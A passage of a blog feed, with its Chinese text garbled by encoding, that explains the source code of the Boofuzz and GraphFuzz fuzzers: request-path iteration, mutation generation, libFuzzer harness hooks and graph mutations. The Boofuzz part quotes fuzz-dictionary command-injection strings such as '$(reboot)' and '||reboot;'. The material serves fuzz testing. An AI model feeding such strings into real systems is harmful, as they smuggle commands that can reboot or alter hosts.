class="hljs-keyword">raise</span> exception.SullyRuntimeError(<span class="hljs-string">"No targets specified in session"</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.edges_from(self.root.<span class="hljs-built_in">id</span>):<br>        <span class="hljs-keyword">raise</span> exception.SullyRuntimeError(<span class="hljs-string">"No requests specified in session"</span>)<br><br>    <span class="hljs-keyword">if</span> path <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">yield</span> path<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> self._iterate_protocol_message_paths_recursive(this_node=self.root, path=[]):  <span class="hljs-comment"># æœ€å…³é”®çš„æ˜¯è¯¥å‡½æ•°</span><br>            <span class="hljs-keyword">yield</span> x<br></code></pre></td></tr></tbody></table></figure><p>è¯¥å‡½æ•°<code>self._iterate_protocol_message_paths_recursive</code>çš„ä½œç”¨æ˜¯è¿”å›ä¸€ä¸ªä»¥è¾¹æ„æˆçš„è·¯å¾„ï¼ˆè¯·æ±‚åºåˆ—ï¼‰</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_iterate_protocol_message_paths_recursive</span>(<span class="hljs-params">self, this_node, path</span>):<br>    <span class="hljs-string">"""Recursive helper for _iterate_protocol.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        this_node (node.Node): Current node that is being fuzzed.</span><br><span class="hljs-string">        path (list of Connection): List of edges along the path to the current one being fuzzed.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Yields:</span><br><span class="hljs-string">        list of Connection: List of edges along the path to the current one being fuzzed.</span><br><span class="hljs-string">    """</span><br>    <span class="hljs-comment"># step through every edge from the current node.</span><br>    <span class="hljs-keyword">for</span> edge <span class="hljs-keyword">in</span> self.edges_from(this_node.<span class="hljs-built_in">id</span>): <span class="hljs-comment"># éå†è¯·æ±‚ä¾èµ–æµå›¾ä¸­ä»¥this_node.idèµ·å§‹çš„è¾¹ï¼ˆä»rootå¼€å§‹ï¼‰</span><br>        <span class="hljs-comment"># keep track of the path as we fuzz through it, don't count the root node.</span><br>        <span class="hljs-comment"># we keep track of edges as opposed to nodes because if there is more then one path through a set of</span><br>        <span class="hljs-comment"># given nodes we don't want any ambiguity.</span><br>        path.append(edge)<br><br>        message_path = self._message_path_to_str(path)<br>        logging.debug(<span class="hljs-string">"fuzzing: {0}"</span>.<span class="hljs-built_in">format</span>(message_path))<br>        self.fuzz_node = self.nodes[path[-<span class="hljs-number">1</span>].dst] <span class="hljs-comment"># ä¸this_nodeè¿æ¥çš„è¾¹çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆè¯¥èŠ‚ç‚¹ä¸ºfuzzèŠ‚ç‚¹ï¼‰</span><br><br>        <span class="hljs-keyword">yield</span> path<br><br>        <span class="hljs-comment"># recursively fuzz the remainder of the nodes in the session graph.</span><br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> self._iterate_protocol_message_paths_recursive(self.fuzz_node, path):<br>            <span class="hljs-keyword">yield</span> x<br><br>    <span class="hljs-comment"># finished with the last node on the path, pop it off the path stack.</span><br>    <span class="hljs-keyword">if</span> path:<br>        path.pop()<br></code></pre></td></tr></tbody></table></figure><p>ä»¥boofuzzçš„æä¾›çš„ftpè„šæœ¬<code>ftp_simple.py</code>ä¸ºä¾‹ï¼Œå…¶è¯·æ±‚ä¾èµ–æµå›¾å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre><code class=" mermaid">graph TBa((root))--&gt;b((user))--&gt;c((pass))--&gt;d((stor))c--&gt;e((retr))</code></pre><p><code>_iterate_protocol_message_paths_recursive</code>ç”Ÿæˆå™¨å°†ä¼šç”Ÿæˆpathæœ‰ï¼š<code>[user]</code>, <code>[user, pass]</code>, <code>[user, pass, stor]</code>, <code>[user, pass, retr]</code></p><p><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>self._generate_n_mutations_for_path(path, depth=depth)</code>ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_n_mutations_for_path</span>(<span class="hljs-params">self, path, depth</span>):<br>    <span class="hljs-string">"""Yield MutationContext with n mutations for a specific message.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        path (list of Connection): Nodes (Requests) along the path to the current one being fuzzed.</span><br><span class="hljs-string">        depth (int): Yield sets of depth mutations.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Yields:</span><br><span class="hljs-string">        MutationContext: A MutationContext containing one mutation.</span><br><span class="hljs-string">    """</span><br>    <span class="hljs-keyword">for</span> mutations <span class="hljs-keyword">in</span> self._generate_n_mutations_for_path_recursive(path, depth=depth):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._mutations_contain_duplicate(mutations):<br>            self.total_mutant_index += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">yield</span> MutationContext(message_path=path, mutations={n.qualified_name: n <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> mutations})<br></code></pre></td></tr></tbody></table></figure><p>è¯¥å‡½æ•°<code>self._generate_n_mutations_for_path_recursive</code>çš„ä½œç”¨æ˜¯</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_n_mutations_for_path_recursive</span>(<span class="hljs-params">self, path, depth, skip_elements=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> skip_elements <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        skip_elements = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">if</span> depth == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">yield</span> []<br>        <span class="hljs-keyword">return</span><br>    new_skip = skip_elements.copy()<br>    <span class="hljs-keyword">for</span> mutations <span class="hljs-keyword">in</span> self._generate_mutations_for_request(path=path, skip_elements=skip_elements):<br>        new_skip.update(m.qualified_name <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> mutations)<br>        <span class="hljs-keyword">for</span> ms <span class="hljs-keyword">in</span> self._generate_n_mutations_for_path_recursive(path, depth=depth - <span class="hljs-number">1</span>, skip_elements=new_skip):<br>            <span class="hljs-keyword">yield</span> mutations + ms<br></code></pre></td></tr></tbody></table></figure><p><code>self._generate_mutations_for_request</code> â€“&gt; <code>self.fuzz_node.get_mutations</code> â€“&gt; <code>self.mutations</code> â€“&gt; <code>item.get_mutations()</code>â€“&gt;<code>mutations() [in string.py]</code>ï¼Œ</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>boofuzz/primitives/string.py</code>ä¸­å®šä¹‰äº†ä¸€äº›å­—å…¸å€¼ï¼Œå­˜æ”¾åœ¨å˜é‡<code>self._fuzz_library</code>ä¸­</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># store fuzz_library as a class variable to avoid copying the ~70MB structure across each instantiated primitive.</span><br>    <span class="hljs-comment"># Has to be sorted to avoid duplicates</span><br>    _fuzz_library = [<br>        <span class="hljs-string">"!@#$%%^#$%#$@#$%$$@#$%^^**(()"</span>,<br>        <span class="hljs-string">""</span>,  <span class="hljs-comment"># strings ripped from spike (and some others I added)</span><br>        <span class="hljs-string">"$(reboot)"</span>,<br>        <span class="hljs-string">"$;reboot"</span>,<br>        ...<br>        <span class="hljs-string">"|touch /tmp/SULLEY"</span>,  <span class="hljs-comment"># command injection.</span><br>        <span class="hljs-string">"||reboot;"</span>,<br>        <span class="hljs-string">"||reboot|"</span>,<br>    ]<br></code></pre></td></tr></tbody></table></figure><p>è¯¥è°ƒç”¨é“¾æ¯æ¬¡ä¼šæ„é€ ä¸€ä¸ªå˜å¼‚ç±»ï¼Œç„¶ååœ¨<code>_main_fuzz_loop</code>æ¨¡ç³Šæµ‹è¯•å¤§å¾ªç¯ä¸­ä½¿ç”¨ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_main_fuzz_loop</span>(<span class="hljs-params">self, fuzz_case_iterator</span>):<br>...<br>            <span class="hljs-keyword">for</span> mutation_context <span class="hljs-keyword">in</span> fuzz_case_iterator:  <span class="hljs-comment"># fuzz_case_iterator --&gt; å˜å¼‚äº§ç”Ÿè¿­ä»£å™¨</span><br>            ...<br></code></pre></td></tr></tbody></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ç®€å•æ¥è¯´ï¼Œboofuzzæ€»ä½“æµç¨‹æ˜¯ï¼š1. <strong>éå†è¯·æ±‚åºåˆ—æµå›¾ï¼ˆæ ‘ï¼‰å¹¶æ„é€ åºåˆ—</strong>ï¼›2. <strong>äº§ç”Ÿå˜å¼‚æ•°æ®</strong>ï¼›3. <strong>å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨</strong></p><p>boofuzzæ•´ä½“æ¡†æ¶å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/2022/09/27/Boofuzz%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/1.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¨¡ç³Šæµ‹è¯•</tag>
      
      <tag>åè®®fuzz</tag>
      
      <tag>å·¥å…·</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GraphFuzzæºç è§£æ</title>
    <link href="/2022/07/25/GraphFuzz%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
    <url>/2022/07/25/GraphFuzz%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="GraphFuzzæºç è§£æ"><a href="#GraphFuzzæºç è§£æ" class="headerlink" title="GraphFuzzæºç è§£æ"></a>GraphFuzzæºç è§£æ</h1><ul><li>æ ¸å¿ƒä»£ç ä½äº<code>core</code>ç›®å½•ä¸‹<ul><li><code>graph.hpp</code>ä¸ºå›¾ç»“æ„ä½“å¤´æ–‡ä»¶ï¼Œä¸»è¦åŒ…å«ä¸€ä¸ªç»“æ„ä½“<code>NodeLink</code>å’Œä¸€ä¸ªç±»<code>TGraph</code></li><li><code>schema.hpp</code>å£°æ˜äº†ä¸€ä¸ªç±»<code>Schema</code>ï¼ŒåŒæ—¶åŒ…å«<code>ScopeDef</code>ã€<code>Signature</code>ï¼Œ<code>hash</code>ï¼Œ<code>ScopeTree</code>å’Œ<code>TypeTree</code>è¿™äº”ä¸ªç»“æ„ä½“</li><li><code>harness.cpp</code>ä¸ºç”Ÿæˆçš„<code>harness</code>æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶è°ƒç”¨<code>libfuzzer</code>çš„æ¥å£æ¥å®ç°ç›¸å…³åŠŸèƒ½</li></ul></li></ul><h2 id="harness-cpp"><a href="#harness-cpp" class="headerlink" title="harness.cpp"></a>harness.cpp</h2><ul><li><p><code>LLVMFuzzerInitialize()</code>ï¼š</p><p>è¯¥å‡½æ•°ä¸º<code>libfuzzer</code>æä¾›çš„æ¥å£ï¼Œç”¨äºè¿›è¡Œæ¨¡ç³Šæµ‹è¯•å‰çš„åˆå§‹åŒ–æ“ä½œï¼š</p><ul><li>forå¾ªç¯ä½“å†…å¯¹å‘½ä»¤è¡Œå‚æ•°è¿›è¡Œè§£æï¼š</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; *argc; ++i) {<br>    <span class="hljs-comment">// do something to parse cmd line</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>å…±æœ‰14ä¸ªå‘½ä»¤è¡Œé€‰é¡¹ï¼š</p><table><thead><tr><th>æ”¯æŒçš„å‘½ä»¤è¡Œé€‰é¡¹</th><th>æè¿°</th></tr></thead><tbody><tr><td>â€“graphfuzz_debug</td><td>æ˜¯å¦å¯ç”¨debug</td></tr><tr><td>â€“graphfuzz_skip_validation</td><td>æ˜¯å¦è·³è¿‡æœ‰æ•ˆæ€§éªŒè¯</td></tr><tr><td>â€“graphfuzz_prune_cache</td><td>æ˜¯å¦ç²¾ç®€ç¼“å­˜</td></tr><tr><td>â€“graphfuzz_enable_soft_execution</td><td>æ˜¯å¦å¯ç”¨è½¯æ‰§è¡Œï¼ˆæœ‰ç‚¹ç±»ä¼¼äºforkserverï¼‰</td></tr><tr><td>â€“graphfuzz_ignore_invalid</td><td>æ˜¯å¦å¿½ç•¥æ— æ•ˆçš„æ¨¡å¼ï¼ˆé»˜è®¤falseï¼‰</td></tr><tr><td>â€“graphfuzz_trace_mutations</td><td>æ˜¯å¦è·Ÿè¸ªå˜å¼‚ï¼Œå¦‚æœå¯ç”¨ï¼Œåˆ™ä¼šä¿å­˜ç›¸å…³æ—¥å¿—</td></tr><tr><td>â€“graphfuzz_catch=</td><td>æ•è·é‚£äº›å¼‚å¸¸ä¿¡å·ï¼Œå€¼ä¸ºè‹¥å¹²ä¸ªä¿¡å·ç¼–å·ï¼Œç”¨é€—å·éš”å¼€</td></tr><tr><td>â€“graphfuzz_scope_max_depth=</td><td>è®¾ç½®æœ€å¤§scope_max_depthï¼Œé»˜è®¤å€¼ä¸º10</td></tr><tr><td>â€“graphfuzz_context_mutation_prob=</td><td>å¯¹ä¸Šä¸‹æ–‡å˜é‡è¿›è¡Œå˜å¼‚çš„æ¦‚ç‡ï¼Œé»˜è®¤ä¸º0.95</td></tr><tr><td>â€“graphfuzz_max_nodes=</td><td>æ¯ä¸ªå›¾æœ€å¤§èŠ‚ç‚¹æ•°ï¼Œé»˜è®¤ä¸º200</td></tr><tr><td>â€“graphfuzz_schema=</td><td>æ¨¡å¼æ–‡ä»¶é‡å‘½åï¼Œé»˜è®¤ä¸ºâ€schema.jsonâ€</td></tr><tr><td>â€“graphfuzz_mutate_one</td><td>â€“graphfuzz_mutate_one &lt;seed&gt; &lt;input&gt; &lt;output&gt;<br>åœ¨åˆå§‹åŒ–é˜¶æ®µå¯¹ç§å­è¿›è¡Œä¸€æ¬¡å˜å¼‚</td></tr><tr><td>â€“graphfuzz_init_corpus</td><td>â€“graphfuzz_init_corpus &lt;corpus&gt;<br>åˆå§‹åŒ–ç§å­</td></tr></tbody></table><ul><li><p><code>Schema::FromFile()</code>ä»<code>schema.json</code>ä¸­è¯»å–æ¨¡å¼æ–‡ä»¶å¹¶ä¿å­˜åˆ°<code>Schema *global_schema</code>å˜é‡ä¸­</p></li><li><p>è°ƒç”¨<code>Schema::Validate()</code>å‡½æ•°æ¥éªŒè¯<code>schema</code>æ˜¯å¦æœ‰æ•ˆï¼Œä¸»è¦æ£€æŸ¥æ¯ä¸ªç±»æ˜¯å¦åŒ…å«æ„é€ æˆ–ææ„å‡½æ•°</p></li><li><p><code>register_signals()</code>ï¼šæ³¨å†Œä¿¡å·ï¼Œä¸»è¦ä¸º <code>graphfuzz_catch</code> å˜é‡æŒ‡å®šçš„éœ€è¦æ•è·çš„ä¿¡å·æ·»åŠ å¥æŸ„å‡½æ•°<code>sig_handler</code>ï¼Œè¯¥å‡½æ•°ä½¿ç”¨<code>siglongjmp()</code>å‡½æ•°è®©ç¨‹åº<strong>è·³è½¬åˆ°å…ˆå‰é…ç½®çš„è·³è½¬ç‚¹</strong></p></li><li><p>å¯¹ç§å­/è¯­æ–™åº“è¿›è¡Œå˜å¼‚æˆ–åˆå§‹åŒ–æ“ä½œï¼ˆäºŒé€‰ä¸€ï¼‰</p></li><li><p><code>global_init(orig_argc, orig_argv)</code>æ‰§è¡Œ<code>fuzz_exec.cpp</code>å®šä¹‰çš„ç›¸å…³æ–¹æ³•ï¼Œç”¨äºå¯¹å‚æ•°è¿›è¡Œåˆå§‹åŒ–æ“ä½œï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸ºç©º</p></li></ul></li></ul><hr><ul><li><code>MutateOne()</code>ï¼š<ul><li>è°ƒç”¨<code>LLVMFuzzerCustomMutator()</code>å¯¹ç§å­è¿›è¡Œå˜å¼‚ï¼Œç„¶åå°†å˜å¼‚åçš„ä¿¡æ¯ä¿å­˜åˆ°<code>--graphfuzz_mutate_one</code>æŒ‡å®šçš„outputä¸­</li></ul></li></ul><hr><ul><li><p><code>LLVMFuzzerCustomMutator()</code>ï¼š</p><p>è¯¥å‡½æ•°ä¸º<code>libfuzzer</code>æä¾›çš„æ¥å£ï¼Œç”¨äºè¿›è¡Œè‡ªå®šä¹‰çš„å˜å¼‚ï¼š</p><ul><li><p>é¦–å…ˆæ ¹æ®æ¨¡å¼æ„å»º<code>TGraph</code>å˜é‡gï¼Œç„¶ågè¯»å…¥ç§å­æ•°æ®å¹¶éªŒè¯å…¶æœ‰æ•ˆæ€§</p><ul><li>å¦‚æœè¯»å…¥å¤±è´¥æˆ–æ— æ³•é€šè¿‡æœ‰æ•ˆæ€§éªŒè¯ï¼Œåˆ™æ ¹æ®ç§å­é‡æ–°åˆ›å»ºä¸€ä¸ªæ–°çš„å›¾</li><li>å¦åˆ™ï¼Œåˆ™è°ƒç”¨<code>TGraph::Mutate</code>æ–¹æ³•è¿›è¡Œå›¾å˜å¼‚ï¼ˆåé€‰ä¸€ï¼‰</li></ul></li><li><p>å°†ç”Ÿæˆçš„å›¾åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶å°†å˜å¼‚åçš„æ•°æ®æ›´æ–°å›ç¼“å†²åŒº</p></li></ul></li></ul><hr><ul><li><p><code>LLVMFuzzerCustomCrossOver()</code>ï¼š</p><p>è¯¥å‡½æ•°ä¸º<code>libfuzzer</code>æä¾›çš„æ¥å£ï¼Œç”¨äºä¸¤ä¸ªç§å­ä¹‹é—´è‡ªå®šä¹‰äº¤å‰å˜å¼‚</p></li></ul><hr><ul><li><p><span class="github-emoji"><span>â­</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>LLVMFuzzerTestOneInput()</code>ï¼š</p><p>è¯¥å‡½æ•°ä¸º<code>libfuzzer</code>æä¾›çš„æ¥å£ï¼Œä¸º<code>libfuzzer</code>ä¸»æ¨¡ç³Šæµ‹è¯•æ¨¡å—ï¼Œç”¨äºå°†ç”Ÿæˆçš„æ•°æ®æŠ•å–‚ç»™ç›®æ ‡</p><ul><li><p><code>sigsetjmp()</code>å‡½æ•°åœ¨<code>LLVMFuzzerTestOneInput()</code>èµ·å§‹å¤„è®¾ç½®è·³è½¬ç‚¹</p></li><li><p>è°ƒç”¨<code>shim_init()</code>å‡½æ•°ï¼Œç¡®ä¿å·²ç»è·å¾—è¦†ç›–ä¿¡æ¯</p></li><li><p>æ„å»ºä¸€ä¸ª<code>TGraph</code>ï¼ˆæ¨¡æ¿å›¾ï¼‰çš„å˜é‡gï¼Œç„¶åè¯»å…¥ç”Ÿæˆçš„æ•°æ®ï¼ˆæ˜¯å¦æˆåŠŸè¯»å…¥ï¼‰ï¼Œå¹¶æ£€éªŒå…¶åˆæ³•æ€§ï¼ˆæ˜¯å¦æœ‰æ„é€ å’Œææ„ï¼‰</p></li><li><p>è°ƒç”¨<code>TGraph</code>ç±»çš„<code>GetOrderedNodes()</code>æ–¹æ³•å¾—åˆ°layeré€’å¢çš„èŠ‚ç‚¹åºåˆ—ï¼Œç„¶åéå†æ¯ä¸€ä¸ªèŠ‚ç‚¹ï¼š</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">void</span> *ref[nodes.<span class="hljs-built_in">size</span>()][MAX_CONN]; <span class="hljs-comment">// ç”Ÿæˆä¸€ä¸ªäºŒç»´æŒ‡é’ˆæ•°ç»„</span><br></code></pre></td></tr></tbody></table></figure><ul><li>é¦–å…ˆè½½å…¥è¾“å…¥ï¼Œå…·ä½“æ¥è¯´ï¼š</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">void</span> *in_ref[n.<span class="hljs-built_in">in_ref_size</span>()];<br><span class="hljs-comment">// ...</span><br>in_ref[i] = ref[n.<span class="hljs-built_in">index</span>()][i]; <span class="hljs-comment">// å°†æŒ‡é’ˆå€¼èµ‹å€¼ç»™in_ref[i]ï¼Œæ˜¾ç„¶é»˜è®¤ä¸º0</span><br></code></pre></td></tr></tbody></table></figure><ul><li>ç„¶åè°ƒç”¨å‡½æ•°ç«¯ç‚¹ï¼Œ</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">void</span> (*func)(<span class="hljs-type">void</span> **, <span class="hljs-type">void</span> **, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *) = FUZZER_SHIMS[n.<span class="hljs-built_in">type</span>()];<br><span class="hljs-built_in">func</span>(in_ref, out_ref, context); <span class="hljs-comment">// å°†in_ref, out_refå’ŒcontextæŠ•å–‚ç»™ç«¯ç‚¹</span><br></code></pre></td></tr></tbody></table></figure><ul><li>æœ€åï¼Œå°†è¾“å‡ºæ‹·è´åˆ°ç»“æœä¸­ï¼ˆæ³¨ï¼šç»“æœåœ¨å‡½æ•°ç«¯ç‚¹è°ƒç”¨æ—¶å·²ç»å†™åˆ°out_refä¸­ï¼‰ï¼Œ</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n.<span class="hljs-built_in">out_ref_size</span>(); ++i) {<br>    NodeRef r = n.<span class="hljs-built_in">out_ref</span>(i);<br>    ref[r.<span class="hljs-built_in">node_idx</span>()][r.<span class="hljs-built_in">conn_idx</span>()] = out_ref[i]; <span class="hljs-comment">// å¦‚æœå½“å‰è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªè¿æ¥èŠ‚ç‚¹çš„è¾“å…¥ï¼Œé‚£ä¹ˆæ›´æ–°refæ•°ç»„</span><br>    <span class="hljs-keyword">if</span> (graphfuzz_debug) {<br>        cout &lt;&lt; <span class="hljs-string">"Got output: "</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">" :: "</span> &lt;&lt; out_ref[i] &lt;&lt; endl;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p><img src="/2022/07/25/GraphFuzz%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/o5.png"></p></li><li><p>è°ƒç”¨<code>shim_finalize()</code></p></li></ul></li></ul><hr><ul><li><code>graphfuzz_try()</code>ï¼š<ul><li>ç”¨äºå®ç°è½¯æ‰§è¡Œï¼Œåœ¨ä¸»æ¨¡ç³Šæµ‹è¯•æµç¨‹ä¸­æœªä½¿ç”¨</li></ul></li></ul><h2 id="graph-hpp"><a href="#graph-hpp" class="headerlink" title="graph.hpp"></a>graph.hpp</h2><ul><li>è¯¥å¤´æ–‡ä»¶å®šä¹‰äº†ä¸€äº›å›¾ç›¸å…³çš„ç»“æ„ä½“å’Œæ–¹æ³•ï¼Œå…¶ä¸­æœ€é‡è¦çš„æ˜¯<code>Mutate()</code>æ–¹æ³•</li></ul><hr><ul><li><p><code>Mutate()</code>ï¼š</p><p>è°ƒç”¨é“¾<span class="github-emoji"><span>ğŸ”—</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f517.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> â€“ <strong>harness.cpp</strong>ï¼š<code>MutateOne()</code> $\rightarrow$ <code>LLVMFuzzerCustomMutator()</code> $\rightarrow$ <code>TGraph::Mutate()</code></p><p>åˆ†ä¸ºä¸¤ç±»å˜å¼‚ï¼š</p><ul><li>ä¸Šä¸‹æ–‡å˜å¼‚<code>MutateContext()</code>ã€æ¦‚ç‡ï¼šé»˜è®¤ä¸º0.95ã€‘</li><li>åŸºäºå›¾å˜å¼‚ï¼ˆä¹é€‰ä¸€ï¼‰ã€å…·ä½“è¯¦è§è®ºæ–‡ã€‘ï¼š</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">switch</span> (mut_choice) {<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: <span class="hljs-built_in">MutateCrosslink</span>(); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-built_in">MutateTruncateDestructor</span>(); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: <span class="hljs-built_in">MutateTruncateConstructor</span>(); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: <span class="hljs-built_in">MutateLayerIndex</span>(); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: <span class="hljs-built_in">MutateSwapEquivalent</span>(); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>: <span class="hljs-built_in">MutateExtendDestructor</span>(); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>: <span class="hljs-built_in">MutateExtendConstructor</span>(); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>: <span class="hljs-built_in">MutateSpliceIn</span>(); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>: <span class="hljs-built_in">MutateSpliceOut</span>(); <span class="hljs-keyword">break</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p><span class="github-emoji"><span>ğŸ¤”</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> å­˜åœ¨é—®é¢˜ï¼šå˜å¼‚æ–¹æ³•è°ƒåº¦ä»…ä½¿ç”¨æ¦‚ç‡ï¼Œå¯èƒ½å­˜åœ¨æŸç§harnessåºåˆ—ä¸Šä¸‹æ–‡è¿‡åº¦å˜å¼‚ã€åŒæ—¶å¯èƒ½ä¼šå¯¼è‡´å›¾å˜å¼‚é¥¿æ­»ã€‘æˆ–è€…ä¸Šä¸‹æ–‡å˜å¼‚ä¸è¶³ã€å¯¼è‡´bugé—æ¼ï¼Œå¯èƒ½ä¼šåœ¨åé¢å›¾å˜å¼‚ç”Ÿæˆç›¸åŒçš„å˜å¼‚æ¨¡å¼ï¼ˆæˆ–ç±»ä¼¼çš„å˜å¼‚æ¨¡å¼ï¼Ÿï¼‰ã€‘</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>æ¨¡ç³Šæµ‹è¯•</tag>
      
      <tag>å·¥å…·</tag>
      
    </tags>
    
